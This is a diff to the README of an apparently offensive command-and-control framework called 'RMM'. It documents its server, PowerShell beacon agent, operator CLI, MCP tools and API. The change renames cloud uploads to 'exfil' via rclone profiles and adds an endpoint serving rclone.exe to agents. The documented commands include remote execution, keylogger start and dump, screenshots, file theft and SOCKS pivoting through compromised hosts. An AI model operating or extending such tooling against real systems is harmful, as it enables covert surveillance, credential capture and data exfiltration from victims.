@@ -31,7 +31,7 @@ The server **requires secrets by default** (no `--insecure`):
 |--------|------------|----------|
 | Operator API | `RMM_API_TOKEN` / `--token` | `/api/v1/*` — list sessions, queue commands, full control |
 | Beacon | `RMM_BEACON_SECRET` / `--beacon-secret` | `/register`, `/cmd`, `/result`, `/ping` — impersonation / hijack |
-| MEGA (optional) | `RMM_MEGA_EMAIL`, `RMM_MEGA_PASSWORD` | Server-side cloud upload account for `mega` / `__MEGA__` (never sent to agents) |
+| rclone exfil (optional) | `RMM_RCLONE_PROFILES` or `RMM_RCLONE_PROFILES_FILE` | Named cloud profiles; agent uploads via rclone (see `docs/rclone-exfil.md`) |
 
 Also: listens on **127.0.0.1** by default (`--bind 0.0.0.0` only behind a firewall), **beacon session IDs** validated (no path-like `id`), artifact files use a **hash prefix** (not `session_id[:8]`), **path traversal** blocked on uploaded filenames, **10 MB** POST body cap, constant-time token checks.
 
@@ -54,10 +54,9 @@ export RMM_API_TOKEN="$(python3 -c 'import secrets; print(secrets.token_urlsafe(
 export RMM_BEACON_SECRET="$(python3 -c 'import secrets; print(secrets.token_urlsafe(32))')"
 python server_rmm.py              # default port 8080, bind 127.0.0.1
 python server_rmm.py 9000 --bind 0.0.0.0   # expose on LAN (use firewall + secrets)
-# Optional MEGA uploads (see docs/mega-upload.md):
-export RMM_MEGA_EMAIL="lab@example.com"
-export RMM_MEGA_PASSWORD="…"
-export RMM_MEGA_FOLDER="RMM"   # optional destination folder
+# Optional rclone exfil (see docs/rclone-exfil.md):
+# Place rclone.exe in tools/rclone/ and configure profiles:
+export RMM_RCLONE_PROFILES_FILE="$PWD/tools/rclone/profiles.example.json"
 ```
 
 ### Operator CLI
@@ -113,8 +112,8 @@ MCP tools mirror `rmm_cli.py` operator actions:
 | `set_sleep` / `set_jitter` / `config set-*` | `patch_config` |
 | `events` | `get_events` |
 | `download` | `queue_download` |
-| `mega` | `queue_mega` |
-| `mega-config` | `get_mega_config` |
+| `exfil` | `queue_exfil` |
+| `rclone-config` | `get_rclone_config` |
 | `upload` | `queue_upload` |
 | `screenshot` | `queue_screenshot` |
 | `socks list` | `list_socks` |
@@ -173,8 +172,8 @@ Beacon endpoints require `X-RMM-Beacon-Token: <RMM_BEACON_SECRET>` (or query `be
 | `POST` | `/sessions/{id}/exec` | `{"command":"…","timeout":120}` | Queue and **wait** for next result event |
 | `POST` | `/sessions/{id}/upload` | `{"remote_path":"…","content_b64":"…"}` | Queue `__UPLOAD__` |
 | `POST` | `/sessions/{id}/download` | `{"remote_path":"…"}` | Queue `__DOWNLOAD__` |
-| `POST` | `/sessions/{id}/mega` | `{"remote_path":"…"}` | Queue `__MEGA__` (agent → server → MEGA; link in events) |
-| `GET` | `/mega/config` | — | MEGA account status (masked email, folder, limits) |
+| `POST` | `/sessions/{id}/exfil` | `{"remote_path":"…","profile":"mega-lab","dest":"…"}` | Queue `__EXFIL__` (agent rclone upload; link in events) |
+| `GET` | `/rclone/config` | — | rclone binary + profile status |
 | `POST` | `/sessions/{id}/screenshot` | — | Queue `__SCREENSHOT__` |
 | `GET` | `/socks` | — | List active SOCKS relays (`relays[]`: url, session, agent, channel) |
 | `POST` | `/sessions/{id}/socks` | `{"port":1080}` or `{"stop":true}` | Start/stop SOCKS5 on `127.0.0.1` via agent |
@@ -210,6 +209,7 @@ Unchanged — used by `client_rmm.ps1`.
 | `GET` | `/register` | `id`, `h`, `u` | `REGISTERED` / `UPDATED` / `403 TERMINATED` |
 | `GET` | `/cmd` | `id` | JSON `{"command":"…","type":"…"}` |
 | `GET` | `/ping` | `id` | `PONG` |
+| `GET` | `/tools/rclone.exe` | `id` | Beacon auth — agent bootstrap binary |
 | `POST` | `/result` | `id`, `type` | Body: output, file JSON, screenshot base64, … |
 
 See sections below for command tokens and result types.
@@ -235,7 +235,7 @@ See sections below for command tokens and result types.
 | `__EXIT__` | Session killed — client exits |
 | `__STOP__` | Clear persistent command |
 | `__DOWNLOAD__ <path>` | Client uploads file (`type=file_upload`) |
-| `__MEGA__ <path>` | Client stages file to server (`type=mega_staging`); server uploads to MEGA (`mega_upload` in events) |
+| `__EXFIL__` + newline + JSON | Agent rclone upload to configured profile (`cloud_upload` in events) |
 | `__UPLOAD__ <path>` + newline + JSON | Client writes remote file |
 | `__SCREENSHOT__` | Screenshot PNG |
 | `__KEYLOG__ start\|stop\|dump` | Keylogger |
@@ -253,9 +253,7 @@ Queue the same tokens via `rmm_cli.py run` / `exec` or `POST …/commands`.
 |--------|------|
 | `output` (default) | JSON `{"rmm_cmd":"…","rmm_output":"…"}` or plain text |
 | `file_upload` | JSON with base64 `content` → `RMM_logs/downloads/` (large files sent in **6 MB chunks** with `offset` / `eof`; no fixed size cap) |
-| `mega_staging` | JSON chunks (same shape as `file_upload`) → temp file → MEGA upload |
-| `mega_upload` | JSON with `link`, `remote_path`, `success`, … (MEGA public link) |
-| `fileio_upload` | Legacy event type (historical transcripts only) |
+| `cloud_upload` | JSON with `link`, `dest`, `profile`, `remote_path`, `success`, … |
 | `screenshot` | Base64 PNG → `RMM_logs/screenshots/` |
 | `keylog` | Text → `RMM_logs/keylogs/` |
 | `config_ack` | Logged / event stream |
@@ -299,8 +297,8 @@ Run **`python rmm_cli.py`** with no arguments for an **interactive console** (li
 | `config set-sleep <n>` | 1–3600 |
 | `config set-jitter <n>` | 0–100 |
 | `download <remote_path>` | Queue `__DOWNLOAD__` |
-| `mega <remote_path>` | Queue `__MEGA__` (MEGA link in events; requires server MEGA config) |
-| `mega-config` | Show MEGA account status on server |
+| `exfil <remote_path> [--profile NAME]` | Queue rclone exfil from agent |
+| `rclone-config` | Show rclone profiles + binary status |
 | `upload <local> <remote>` | Queue `__UPLOAD__` |
 | `socks [port]` / `socks stop` | SOCKS5 on 127.0.0.1 via remote agent (default port 1080) |
 | `events` | Poll result events (`--since`, `--limit`) |
@@ -317,7 +315,7 @@ Same commands as before (`list`, `use`, `set_sleep`, shell commands, etc.). Pref
 
 ## Client (`client_rmm.ps1`)
 
-All settings live in a **configuration block at the top of the script** (`$u`, `$beaconSecret`, `$httpProxy`, …). Optional environment variables override those variables when set: `RMM_BASE_URL`, `RMM_BEACON_SECRET`, `RMM_HTTP_PROXY`, `RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS`, `RMM_PERSISTENT_HTTP`, `RMM_VERBOSE`, `RMM_MEGA_MAX_BYTES` (default 100 MB cap before MEGA staging upload).
+All settings live in a **configuration block at the top of the script** (`$u`, `$beaconSecret`, `$httpProxy`, …). Optional environment variables override those variables when set: `RMM_BASE_URL`, `RMM_BEACON_SECRET`, `RMM_HTTP_PROXY`, `RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS`, `RMM_PERSISTENT_HTTP`, `RMM_VERBOSE`. rclone exfil uses server-side profiles (no credentials in the agent script).
 
 - **URL:** edit `$u` or set `RMM_BASE_URL`.
 - **Beacon secret:** edit `$beaconSecret` or set `RMM_BEACON_SECRET` (must match the server).
